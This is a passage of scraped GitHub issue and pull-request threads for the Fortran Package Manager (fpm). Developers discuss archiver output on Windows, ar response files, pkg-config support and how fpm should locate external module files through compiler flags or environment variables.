            "text": "fpm git~master started displaying GNU' ar Copyright notice on build, run and install subcommands.\nExample output:\nC:\\Temp>fpm new test222\n + mkdir test222\n + cd test222\n + mkdir test222\\src\n + mkdir test222\\app\n + mkdir test222\\test\n + git init test222\nInitialized empty Git repository in C:/Temp/test222/.git/\n\nC:\\Temp>cd test222\n\nC:\\Temp\\test222>fpm build\n + mkdir build\\dependencies\nGNU ar (GNU Binutils) 2.35.2\nCopyright (C) 2020 Free Software Foundation, Inc.\nThis program is free software; you may redistribute it under the terms of\nthe GNU General Public License version 3 or (at your option) any later version.\nThis program has absolutely no warranty.\n + mkdir build\\gfortran_2A42023B310FA28D\\test222  \u2026 \n\nC:\\Temp\\test222>fpm run\nGNU ar (GNU Binutils) 2.35.2\nCopyright (C) 2020 Free Software Foundation, Inc.\nThis program is free software; you may redistribute it under the terms of\nthe GNU General Public License version 3 or (at your option) any later version.\nThis program has absolutely no warranty.\n Hello, test222!",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-24 13:38:12+00:00",
                    "text": "Thanks for reporting; that's a little annoying. Looks like this execute command line needs to be piped to /dev/null and the Windows equivalent.\n\n  \n    \n      fpm/src/fpm_environment.f90\n    \n    \n         Line 196\n      in\n      a9adf2b\n    \n    \n    \n    \n\n        \n          \n           call execute_command_line(\"ar --version\", exitstat=estat)"
                },
                {
                    "user": "brocolis",
                    "date": "2021-05-09 02:26:01+00:00",
                    "text": "I think the archiver resolution should be part of a more general toolchain profile. For example, if the compiler is gfortran, then fpm can assume the archiver is ar, the assembler is as, the C++ compiler is g++, etc."
                },
                {
                    "user": "isuruf",
                    "date": "2021-05-27 16:55:06+00:00",
                    "text": "For example, if the compiler is gfortran, then fpm can assume the archiver is ar, the assembler is as, the C++ compiler is g++, etc.\n\nfpm should first look at AR env variable and if not set ask gfortran what the archiver name is gfortran -print-prog-name=ar should give the archiver name.\ncc @certik"
                }
            ]
        },
        {
            "number": 454,
            "user": "brocolis",
            "date": "2021-04-20 20:28:53+00:00",
            "title": "Option to unconditionally rebuild projects",
            "text": "It would be nice to have an option to unconditionally rebuild projects - akin to GNU make' -B|--always-make [1]\nAs an example, consider this use case\nfpm build\nset PATH=C:\\gfortran-11-RC1\\bin\nfpm build -B\nset PATH=C:\\gfortran-9\\bin\nfpm build -B\nAlternatively, @urbanjost suggested \"clean\" subcommand in #127\nI also like this syntax:\nfpm build\nset PATH=C:\\gfortran-11-RC1\\bin\nfpm clean build\nset PATH=C:\\gfortran-9\\bin\nfpm clean build\n[1] https://www.gnu.org/software/make/manual/html_node/Options-Summary.html",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-04-20 23:11:47+00:00",
                    "text": "A fpm-clean plugin would work for now."
                }
            ]
        },
        {
            "number": 453,
            "user": "everythingfunctional",
            "date": "2021-04-20 19:17:26+00:00",
            "title": "Allow modules with the same name in app and test",
            "text": "Main programs in the app directory do not link to any code in the test directory, and vice-versa. So there should be no reason that you can't have modules with the same name in those two places. (You could probably include example in there as well. However, fpm currently complains that there are duplicate modules in this case. Also, because all of the object and module files are currently output in the same folder there is a collision of the *.mod file names.\nThe Haskell version was putting the outputs into different places. We should go back to doing that, and not look into app when searching for duplicate modules for test and vice-versa.",
            "comments": []
        },
        {
            "number": 452,
            "user": "milancurcic",
            "date": "2021-04-19 21:39:13+00:00",
            "title": "Use environment variable to pass external module paths to the compiler",
            "text": "Since #438, it's possible to use external (non-fpm packaged) modules as dependencies.\nThere are currently two possible ways to do this:\n\nPass the path explicitly via --flag, e.g.:\n\nfpm build --flag \"-I/path/to/my/external/dependencies\"\n\n\nLink all modules into a include (default) directory and let fpm pick them up.\n\nOption 1 is verbose and error-prone, especially when you start to include more than one non-fpm dependency into the project. It's particularly bad during development when I want to type fpm build often.\nOption 2 is much easier but inelegant. It's difficult to manage different versions of dependencies or dependencies built by different compilers (both are common use cases in my field) because you'd need to replace the files or symlinks.\nRather than managing the external dependency modules on a file system level, I suggest to introduce an fpm-specific environment variable to pass the paths to the compiler.\nOriginally proposed by @LKedward here. A candidate variable name, proposed by @certik here, is FPM_EXTERNAL_MODULES_PATH. Which I like as well.\n#444 would solve this (variable name aside), but it turns out it was trying to solve something else.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-04-19 23:43:18+00:00",
                    "text": "It seems if we get FPM_EXTERNAL_MODULES_PATH working, then we can later move to CPATH if that is what we would like, but it gets the feature implemented. I think we can change things until we reach fpm 1.0, so the above should work."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-20 08:12:58+00:00",
                    "text": "+1 from me. As per my original comment, this isn't meant as a perfect long-term solution, rather it simply allows fpm projects to easily use system-installed modules right away. It is noted that we harm reproducibility, but this is the nature of using system-installed modules, not the proposed method of doing so in fpm."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-20 15:21:49+00:00",
                    "text": "It seems if we get FPM_EXTERNAL_MODULES_PATH working, then we can later move to CPATH if that is what we would like, but it gets the feature implemented.\n\nI don't think there will be a need for CPATH once FPM_EXTERNAL_MODULES_PATH is working. I think CPATH came up only because some compilers use it as their own convention to find modules, but I've never used it myself."
                }
            ]
        },
        {
            "number": 451,
            "user": "awvwgk",
            "date": "2021-04-18 08:41:01+00:00",
            "title": "Refactor: use objects to represent compilers and archiver",
            "text": "This patch doesn't change any functionality, but just shuffles things around.\n\nFortran and C compiler are represented by thin compiler_t object\narchiver is represented by thin archiver_t object\nallows easier abstraction by moving from type(archiver_t) to class(archiver_t), allocatable later\n\nRelevant for #442, #449",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-24 13:45:21+00:00",
                    "text": "Thanks, this is a useful refactoring. Feel free to incorporate #449 directly into this PR instead if easier."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-27 15:09:35+00:00",
                    "text": "This branch has diverged from the current main line, I'm going to close it, since it is easier to reimplement the changes again than updating the branch.\nThis branch can be resurrected from 8325a09 if needed."
                }
            ]
        },
        {
            "number": 450,
            "user": "LKedward",
            "date": "2021-04-17 11:51:19+00:00",
            "title": "Remove coarray flag from intel debug settings",
            "text": "Looks like I only removed the coarray flags from the release settings. This PR removes them also from the debug settings.",
            "comments": []
        },
        {
            "number": 449,
            "user": "LKedward",
            "date": "2021-04-17 11:38:26+00:00",
            "title": "Response files with ar on Windows",
            "text": "@awvwgk, response files seem to work on Windows if the objects paths are written in unix style.\nFixes #427.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 11:46:59+00:00",
                    "text": "The error on Windows seemed like an issue with the path of the response file, and I was planning to look into changing the directory first before creating the response file, but if the same issue also applies for the content of the response file than this won't work at all.\nNow I would be intrigued how well this plays together with #442 when lib instead of ar is used."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-17 11:56:36+00:00",
                    "text": "Now I would be intrigued how well this plays together with #442 when lib instead of ar is used.\n\nLooks like response files are supported with lib but we'll probably have to add some ugly logic in the backend to choose between unix_path/windows_path when writing the response file."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 14:17:35+00:00",
                    "text": "Maybe creating an archiver_t that knows how to create a static library would work. The logic to determine which path to choose than goes in the instantiation of the object rather than the target evaluation."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-06-04 17:02:50+00:00",
                    "text": "I hit this issue on two of my projects in the last two days, so I'm keen to get this merged in. I think this looks good enough to me, but I'll give @LKedward and @awvwgk a chance to hold it back if they think it needs to be."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-04 19:06:04+00:00",
                    "text": "Brad @everythingfunctional, would you mind testing this with lib instead of ar if you have access to a Windows machine (I don't have one). I might have time this weekend to get #451 up to speed, which gives a more robust way to handle response files (they don't work on OSX if I recall correctly)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-06-04 19:31:39+00:00",
                    "text": "@awvwgk , I've got a couple of Windows environments, unfortunately both have things installed and setup with ar available in the PATH, so I can't be sure that it will work with lib, but I can say that it does work with ar. My understanding is that the response file is a feature of the Windows \"command shell\", not of the executables, so I don't see why they would behave any different."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-05 09:29:55+00:00",
                    "text": "Thanks for updating and reviewing @everythingfunctional - I'm happy for this to move forward \ud83d\udc4d\nI'm not able to test with lib unfortunately since I don't have visual studio installed."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-05 12:33:33+00:00",
                    "text": "Thanks both - I'll now merge then."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-06-10 19:02:38+00:00",
                    "text": "Brad @everythingfunctional, would you mind testing this with lib instead of ar if you have access to a Windows machine (I don't have one). I might have time this weekend to get #451 up to speed, which gives a more robust way to handle response files (they don't work on OSX if I recall correctly).\n\nI did get a chance to set up a Windows environment and test with lib. It works, so we're all good."
                }
            ]
        },
        {
            "number": 448,
            "user": "awvwgk",
            "date": "2021-04-17 11:02:43+00:00",
            "title": "Allow usage of response files with ar",
            "text": "Fixes #427\nFrom the man page of ar:\n   @file\n       Read command-line options from file.  The options read are inserted\n       in place of the original @file option.  If file does not exist, or\n       cannot be read, then the option will be treated literally, and not\n       removed.\n\n       Options in file are separated by whitespace.  A whitespace\n       character may be included in an option by surrounding the entire\n       option in either single or double quotes.  Any character (including\n       a backslash) may be included by prefixing the character to be\n       included with a backslash.  The file may itself contain additional\n       @file options; any such options will be processed recursively.\n\nThe response file will not be deleted but kept as \u201cbuild\u201d artifact to allow inspection on errors.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 11:07:27+00:00",
                    "text": "Apparently this is not portable and not supported by all ar versions, especially not the one on Windows. So no fix for Windows with this approach."
                }
            ]
        },
        {
            "number": 446,
            "user": "awvwgk",
            "date": "2021-04-16 22:31:48+00:00",
            "title": "Should fpm attempt to fix known issues in compilers",
            "text": "Related to GFortran not using the include paths of the C compiler (/usr/include, /usr/local/include, ...) to search for module files, but packages installing under those directories assuming modules will be found.\nThis bug was reported 2008 for GFortran 4.3.0: https://gcc.gnu.org/bugzilla/show_bug.cgi?id=35707",
            "comments": []
        },
        {
            "number": 445,
            "user": "ivan-pi",
            "date": "2021-04-16 17:39:08+00:00",
            "title": "Fortran packages using pkg-config",
            "text": "I've created this issue to keep track of some of the (scientific) packages which provide a pkg-config file and could be candidates for testing with fpm.\n\n stdlib\n fgsl (Fortran interface to the GNU Scientific Library)\n Intel\u00ae oneAPI Math Kernel Library\n NetCDF-4.2 and later\n HDF5\n fftw3\n blis\n\nYou can see a list of package files already installed on your system with the command pkg-config --list-all.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2021-04-16 17:39:42+00:00",
                    "text": "Feel free to add more packages to the first post."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-16 17:56:37+00:00",
                    "text": "stdlib does provide a pc file and even some more or less transparent logic how it is generated:\nhttps://github.com/fortran-lang/stdlib/blob/3621b03c5748b309113316168eae7b6ddc973851/config/CMakeLists.txt#L3-L13"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-17 08:45:30+00:00",
                    "text": "Related to FFTW and also discussion #447, the default installation of FFTW will place a set of source files containing the interfaces to the C routines in /usr/include:\n$ ls /usr/include/fftw* -l\n-rw-r--r-- 1 root root  2447 Dez  9  2017 /usr/include/fftw3.f\n-rw-r--r-- 1 root root 54596 Dez  9  2017 /usr/include/fftw3.f03\n-rw-r--r-- 1 root root 31394 Dez  9  2017 /usr/include/fftw3.h\n-rw-r--r-- 1 root root 26983 Dez  9  2017 /usr/include/fftw3l.f03\n-rw-r--r-- 1 root root 25682 Dez  9  2017 /usr/include/fftw3q.f03\n\nNow to bypass the whole issue of shipping Fortran modules, the FFTW manual recommends that users who want to import FFTW routines as a module, should define one themselves:\n  module FFTW3\n    use, intrinsic :: iso_c_binding\n    include 'fftw3.f03'\n  end module\n\nHowever, since gfortran doesn't search /usr/include/, anyone who wants to use FFTW still needs to append the flag -I/usr/include.\nAlso the system installed .pc file is not geared towards Fortran users:\n$ pkg-config --cflags fftw3\n\n$ pkg-config --libs fftw3\n-lfftw3"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 08:47:48+00:00",
                    "text": "We would have to add --keep-system-cflags in case we detect GFortran to work around this issue.\n\u276f pkg-config fftw3 --cflags --keep-system-cflags\n-I/usr/include"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-17 08:55:56+00:00",
                    "text": "It looks like you are using pkgconf (see https://github.com/pkgconf/pkgconf/blob/2fdc5f0081dcf22fa476767877d13097eb81e255/cli/main.c#L849)\nOn my installation:\n$ pkg-config --version\n0.29.1\n$ pkg-config fftw3 --cflags --keep-system-cflags\nUnknown option --keep-system-cflags\n\nSo the different command line options of pkg-config programs can potentially make a bigger mess.\nThis might also affect your reply to Milan in #439 (comment)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 09:03:38+00:00",
                    "text": "Arch Linux uses pkgconf (1.7.3) with symlinking it as pkg-config. This means we can't workaround this issue with GFortran by using pkg-config options because they won't be supported in all implementations.\nOur alternatives for GFortran would be\n\nimplement our own non-standard pkg-config to read the pc files in a GFortran friendly way\nmanually detect the system include paths and append them to the compile arguments as -I options\nfix the bug in upstream GFortran"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 10:35:06+00:00",
                    "text": "Another solution for FFTW3 with GFortran would be using the C preprocessor instead of the Fortran include directive with:\nmodule fftw3\n   use, intrinsic :: iso_c_binding\n#include \"fftw3.f03\"\nend module fftw3"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-17 16:19:17+00:00",
                    "text": "That works, but the file needs to given the .F90 suffix in order to invoke the preprocessor automatically (for all compilers). In the long term, I would ultimately prefer the system fftw packages change their default install location (and suffix) of the interface files (unless we reach agreement that /usr/include/ is the right location for these).\nAnother option would be to offer an fftw3 module fpm package in a fortran-lang repository."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-05-24 11:30:01+00:00",
                    "text": "Should this be of use, sometime ago I wrote a module to read pkg-config files, including substitution of macros.\nSee the attached file: pkgconfig.f90.txt"
                }
            ]
        },
        {
            "number": 444,
            "user": "awvwgk",
            "date": "2021-04-16 17:23:57+00:00",
            "title": "Allow to find include files / modules in CPATH environment variable",
            "text": "This should make it easier for GFortran based builds to find modules in non-standard locations",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-04-16 22:21:26+00:00",
                    "text": "This will not resolve the issue that GFortran is not searching in the systems default include directory from the C compiler (like /usr/include), where system provided modules might be installed. Gaining knowledge on the default include directories of the C compiler might be more tricky (requires to invoke C compiler), but assuming paths is difficult.\nAny ideas how to force GFortran to actually look for system installed module files?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 09:15:58+00:00",
                    "text": "We could try to parse the cpp include paths from the output of\n\u276f gfortran -E -v - < /dev/null\nUsing built-in specs.\nCOLLECT_GCC=gfortran\nTarget: x86_64-pc-linux-gnu\nConfigured with: /build/gcc/src/gcc/configure --prefix=/usr --libdir=/usr/lib --libexecdir=/usr/lib --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=https://bugs.archlinux.org/ --enable-languages=c,c++,ada,fortran,go,lto,objc,obj-c++,d --with-isl --with-linker-hash-style=gnu --with-system-zlib --enable-__cxa_atexit --enable-cet=auto --enable-checking=release --enable-clocale=gnu --enable-default-pie --enable-default-ssp --enable-gnu-indirect-function --enable-gnu-unique-object --enable-install-libiberty --enable-linker-build-id --enable-lto --enable-multilib --enable-plugin --enable-shared --enable-threads=posix --disable-libssp --disable-libstdcxx-pch --disable-libunwind-exceptions --disable-werror gdc_include_dir=/usr/include/dlang/gdc\nThread model: posix\nSupported LTO compression algorithms: zlib zstd\ngcc version 10.2.0 (GCC) \nCOLLECT_GCC_OPTIONS='-E' '-v' '-mtune=generic' '-march=x86-64'\n /usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/cc1 -E -quiet -v - -mtune=generic -march=x86-64\nignoring nonexistent directory \"/usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/../../../../x86_64-pc-linux-gnu/include\"\n#include \"...\" search starts here:\n#include <...> search starts here:\n /usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/include\n /usr/local/include\n /usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/include-fixed\n /usr/include\nEnd of search list.\n# 1 \"<stdin>\"\n# 1 \"<built-in>\"\n# 1 \"<command-line>\"\n# 31 \"<command-line>\"\n# 1 \"/usr/include/stdc-predef.h\" 1 3 4\n# 32 \"<command-line>\" 2\n# 1 \"<stdin>\"\nCOMPILER_PATH=/usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/:/usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/:/usr/lib/gcc/x86_64-pc-linux-gnu/:/usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/:/usr/lib/gcc/x86_64-pc-linux-gnu/\nLIBRARY_PATH=/usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/:/usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/../../../../lib/:/lib/../lib/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-pc-linux-gnu/10.2.0/../../../:/lib/:/usr/lib/\nCOLLECT_GCC_OPTIONS='-E' '-v' '-mtune=generic' '-march=x86-64'\n\nand manually append them. But now we are getting into working around compiler bugs. I'll mark this as won't fix until we established a strategy how to deal with such issues, see #447."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-18 01:19:20+00:00",
                    "text": "I added 4 reviewers to this, with hope to get consensus on whether we should merge this or not."
                },
                {
                    "user": "certik",
                    "date": "2021-04-18 17:47:44+00:00",
                    "text": "Can you explain the use case that this is trying to fix?\nI think no doubt fpm must give the compilers (including GFortran) the correct paths to find modules in whatever way it has to be done.\nI don't think we should depend on environment variables like CPATH, FFLAGS, FC, etc., or do we? This is part of the design decisions what we want fpm to be. If users have such environment variables set up, and it causes fpm to break (because it finds system modules that it should not find, or uses compiler flags that it should not), I don't think that's a good design.  So that is why I am asking what exact use case you are trying to implement here."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-18 18:37:11+00:00",
                    "text": "The use case is to tell the compiler where to find modules, without having to do it on the CLI which is possible but unwieldy.\nI don't know about the background on CPATH. I haven't used it before for Fortran, and I think the motivation for that name is that other compilers use it.\nI think the more relevant question is whether to use env vars in fpm at all. If yes, this could be fpm-specific, like FPM_MODULES_PATH or similar."
                },
                {
                    "user": "certik",
                    "date": "2021-04-18 19:12:13+00:00",
                    "text": "I still don't understand the use case: why do you need to tell fpm where to find modules? fpm knows where all modules are because it was fpm who compiled them in the first place.\n(Yes, FPM_MODULES_PATH instead of CPATH would be a better way to do it.)"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-18 19:22:21+00:00",
                    "text": "This is for finding external dependencies, like HDF5 and NetCDF."
                },
                {
                    "user": "certik",
                    "date": "2021-04-18 20:13:32+00:00",
                    "text": "I see. I can see a use case where you use Spack or the module system at an HPC machine to load quite a few such dependencies and you would like to use fpm and still pick them up.\nSo for that FPM_MODULES_PATH seems like the way to go, or perhaps even FPM_EXTERNAL_MODULES_PATH."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-18 20:19:15+00:00",
                    "text": "I still don't understand the use case: why do you need to tell fpm where to find modules? fpm knows where all modules are because it was fpm who compiled them in the first place.\n\nLike the title says, it's not just about modules but also include files.\nTaking as an example the NLopt library. If I install the developer files with sudo apt-get install libnlopt-dev, it installs the file nlopt.f in the directory /usr/include. Calling codes in Fortran are supposed to use this file as:\ninclude(nlopt.f)\n\nHowever, since this location is not on gfortran's default include path, I still need to add the flag  -I/usr/includemanually."
                },
                {
                    "user": "certik",
                    "date": "2021-04-18 20:35:05+00:00",
                    "text": "@ivan-pi we could do FPM_EXTERNAL_MODULES_PATH for compiled module files and FPM_EXTERNAL_SOURCES_PATH for your use case to find nlopt.f."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-18 20:37:02+00:00",
                    "text": "I can see a use case where you use Spack or the module system at an HPC machine to load quite a few such dependencies and you would like to use fpm and still pick them up.\n\nSure, and I typically set paths manually to my own builds from source, so that's another use case."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-19 19:13:06+00:00",
                    "text": "There are some subtle issue with this patch and I also think it is trying to solve the wrong problem. The main issue here is about consistency IMO.\nThere are two way a Fortran processor can depend on external files:\n\nusing a preprocessor with #include (cpp), #:include (fypp)\nusing the Fortran processor with include (Fortran source) or use (compiler specific files)\n\nFor the C preprocessor cpp there is a standardized way to add search directories to the search path using the CPATH environment variable. For the processor this is probably not defined and the compiler is free to chose whether or not to use CPATH, GFortran decided to not use it, Intel Fortran is using it extensively (check your environment after loading Intel Fortran or MKL). The primary use case in Intel's setup is to locate files for Fortran include statements, there is no module file in the CPATH set by MKL but mixed format headers with interface blocks.\nLeaving aside that GFortran at least lacks proper documentation on this behaviour, this discrepancy burns the CPATH environment variable for our use unless we make it consistent ourselves. Fixing this behaviour by just reading the environment variable CPATH is also incorrect, because we wouldn't account for the system paths. Frankly, GFortran's behaviour encourages usage of the C preprocessor with #include rather than include because the Fortran variant is much less powerful than the C variant.\nEventually, it boils down to the issue why we started fpm: dependencies between Fortran projects. The actual issue is that Fortran projects install their compiler dependent module files in the system include path together with their compiler agnostic include files. I think we all agree that this is not the way this problem is to be solved.\nLet's focus on the question at hand, is there a way we can allow an fpm user to work around the problem of compiler not properly documenting its behaviour and a Fortran package installing files where they don't belong in a minimally painful way? The answer so far is --flag."
                },
                {
                    "user": "certik",
                    "date": "2021-04-19 20:59:36+00:00",
                    "text": "@awvwgk does this fix your use case: #444 (comment) ?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-19 21:30:27+00:00",
                    "text": "I would refrain from introducing new environment variables whenever possible. But the general idea to split the module search from the include file search is a good one, there are indeed compilers that implement this approach (at least one, don't remember which), but it is not generally available from all vendors so we can't implement it."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-19 21:41:17+00:00",
                    "text": "@awvwgk What's the alternative then? --flag is overly verbose and error prone. I think an env variable is still better than symlinking external module files into the project tree."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-19 22:17:09+00:00",
                    "text": "What's the alternative then?\n\nI wish I had an (easy) answer for you.\nMy concern are mainly reproducible builds here. Would you consider a change in this environment variable a change in the build environment? Should it go into the build hash or not? If it does not, interesting things might happen if change the HDF5 external module path from version 1.10 to 1.12 and do an incremental rebuild.\nAlso, I'm currently not seeing how this would solve the issue if I'm building with multiple compilers (different versions, different vendors)."
                },
                {
                    "user": "certik",
                    "date": "2021-04-19 23:45:27+00:00",
                    "text": "Well, that's the issue with depending on external libraries. I feel using CPATH would make it even worse, at least we can control FPM_EXTERNAL_MODULES_PATH and yes, it seems it should be part of the hash. Alternatively, you can specify FPM_EXTERNAL_MODULES_PATH on the command line."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-19 23:48:37+00:00",
                    "text": "Reproducible builds are important.\n\nWould you consider a change in this environment variable a change in the build environment? Should it go into the build hash or not?\n\nYes, it should. And that's not enough for reproducible builds. A module file under any path (regardless of how it's passed, --flag, include-dir, or env. var) could change and break the build. That's more complex, but still feasible to solve. One solution could be to, for each external module that's used, take a SHA sum of the file and have it go into the build hash.\nIn that sense, current approaches to external modules are not reproducible either. But env. variable would not make it worse in this regard, and would be better relative to the include-dir approach, which is (sadly) currently my best option for external modules.\n\nAlso, I'm currently not seeing how this would solve the issue if I'm building with multiple compilers (different versions, different vendors).\n\nThis:\n#export FPM_EXTERNAL_MODULES_PATH=$FPM_EXTERNAL_MODULES_PATH_GNU\nexport FPM_EXTERNAL_MODULES_PATH=$FPM_EXTERNAL_MODULES_PATH_INTEL\n\nis easier to do than replacing module files in include/ every time I want to switch compilers."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-20 09:25:54+00:00",
                    "text": "I wonder if we are over-stating the issue of external .mod files, which might be relevant only for small number of third party packages (so far netcdf-fortran and HDF5 are the only examples mentioned). As @LKedward  wrote in #439 (comment):\n\nMy opinion on this is that in the short term we should provide an environment variable that allows specifying include directories to fpm for existing pre-built .mod files, and in the long term we encourage/help developers to provide proper module interfaces for their libraries that can be distributed as fpm packages.\n\nA first step would be to add a section to the  fpm documentation site, or a section in the packaging guide about creating  fpm  compatible interface to external libraries."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-20 15:12:46+00:00",
                    "text": "I wonder if we are over-stating the issue of external .mod files, which might be relevant only for small number of third party packages (so far netcdf-fortran and HDF5 are the only examples mentioned).\n\nIt's relevant for any 3rd party package that provides a module. There may not be many of them, but the few of them have a huge surface area. So the number of packages is not necessarily the relevant variable. If you mean to say \"I won't use it, so we shouldn't support it\", that's not a helpful argument and it's dismissive of other users. The issue is overstated if you don't need it, and it's understated if you do need it. I need it. :)\nSupport for external modules allows me to use fpm for professional work and not just hobby toy projects. Before #438 I could only play with fpm and that's it. So I feel strongly about this feature. NetCDF is the main one. MPI is mostly taken care of thanks to its wrappers. Once I have those two working well, ESMF will be the next one. Maintaining these as fpm packages will be possible, but extremely challenging (HPC-oriented, cross-platform, multi-language, in active development i.e. a moving target, etc.). So it's not a reasonable solution in the present.\nAnd we already support this thanks to #438. So the question now is not whether to support it, but how to improve the UI? Currently it's not good, see #452.\n\nA first step would be to add a section to the fpm documentation site, or a section in the packaging guide about creating fpm compatible interface to external libraries.\n\nYes, we should do this, and it's a long-term goal for fpm for all Fortran packages to be fpm packages. But it's a separate and orthogonal issue. Until all packages are fpm packages, there must be good support for 3rd party modules."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-20 15:25:28+00:00",
                    "text": "How do packages like NetCDF and HDF5 deal with the problem that *.mod files are not compatible between different compilers (and sometimes even between different versions of the same compiler)? Do they ship multiple collections of the module files, one for each supported compiler and version?\nPersonally, I prefer command line arguments to environment variables. I get a bit annoyed at things cluttering up my environment. Also, they get documented in the help message, so if I forget how to supply that info, a simple fpm build --help will be enough to find it.\nAlso, given the (relatively) small number of external packages that may need to be supported this way, should they be supported as \"features\" that are on for a package that needs them, and users have a config file (maybe $HOME/.config/fpm.toml) that specifies where the installation resides for a given compiler? That seems like the easiest system for users to maintain."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-20 15:37:42+00:00",
                    "text": "How do packages like NetCDF and HDF5 deal with the problem that *.mod files are not compatible between different compilers (and sometimes even between different versions of the same compiler)? Do they ship multiple collections of the module files, one for each supported compiler and version?\n\nI don't think they do at all. If you get them through the package manager, it's its responsibility. If you build them from source, it's your responsibility. I don't know what Conda or Spack do about it.\nI use both the system provided-package for system-provided gfortran, and builds from source for custom versions and other compilers.\n\nPersonally, I prefer command line arguments to environment variables. I get a bit annoyed at things cluttering up my environment.\n\nTry it with include paths. I did. It's pretty bad. You have to try it to really appreciate it. :)"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-20 16:22:10+00:00",
                    "text": "If you mean to say \"I won't use it, so we shouldn't support it\", that's not a helpful argument and it's dismissive of other users. The issue is overstated if you don't need it, and it's understated if you do need it. I need it. :)\n\nI'm sorry if my comment sounded dismissive. I understand NetCDF is a highly used library relevant to potentially hundreds of Fortran projects. I am aware of circumstances around such packages (some outlined in your second paragraph) that make them a difficult target. To use the (third-party) nlopt library I currently also rely on hard-wiring the build folder location directly in my Makefiles. Before investigating pkg-config I did the same for Intel MKL. Not elegant, but it allows me to get on with my work.\nI just thought that if there is only of a handful of such libraries, it might be easier to focus our effort on implementing fpm support \"upstream\" (e.g. in a fortran-lang fork of the netcdf-fortran repository) than to design temporary \"shortcuts\" in fpm. After taking a closer look at the netcdf-fortran Makefile and CMake file I understand this is not a simple task (the build settings are highly configurable with some settings depending on how the underlying C library was built, the m4 macro processor is needed, ...).\n\nUntil all packages are fpm packages, there must be good support for 3rd party modules.\n\nNow that I have better grasp of your usage case, I can appreciate why a (compiler-independent) way to specify module locations is needed. The next breakpoint for the transformation of third-party libraries into fpm packages will be when custom build scripts are supported (#219)."
                },
                {
                    "user": "certik",
                    "date": "2021-04-20 16:32:11+00:00",
                    "text": "I don't think that @ivan-pi was dismissive. We all agree that we need to support this somehow. What we are discussing is a short term as well as a long term solution. The short term solution is to make fpm more usable for work today. But just like in #443, I don't want us to be \"comfortable\" with the short term solution and think we are done. Instead I want us to also design a good solution long term, which we will all reap benefits from for years to come."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-20 17:19:50+00:00",
                    "text": "I don't think that @ivan-pi was dismissive.\n\nRight, that's why I was careful to phrase it as \"If you mean to say \"I won't use it, so we shouldn't support it\"\". ;)\nI 100% agree with what you wrote."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-20 17:32:18+00:00",
                    "text": "... it might be easier to focus our effort on implementing fpm support \"upstream\" (e.g. in a fortran-lang fork of the netcdf-fortran repository)\n\nI strongly believe that fpm will eventually be the build system and package manager of almost all Fortran packages, and all new ones. In other words, there will be a time when it will be weird for a package to not have fpm.toml in it, like Cargo.toml in Rust.\nFor legacy (unmaintained) packages, we may have to maintain a fork under fortran-lang.org, which is more work.\nFor active packages like NetCDF or MPI, I think it would be easier to convince and collaborate their developers to adopt an fpm.toml and restructure if needed. Then we wouldn't have to maintain a fork ourselves and make sure it's synced with the original project. Convincing their developers to include and then maintain an fpm manifest may be even easier if we can point them to the large number of fpm packages that use their library as a dependency.\nIn that sense, it's possible that the short-term solution would help the long-term vision by developing a track record and a network effect within the fpm ecosystem."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-20 17:56:10+00:00",
                    "text": "I'm sorry if my comment sounded dismissive.\n\n@ivan-pi I apologize for assuming too much about your comment and not taking it in the best light. I know that you didn't mean to be dismissive."
                },
                {
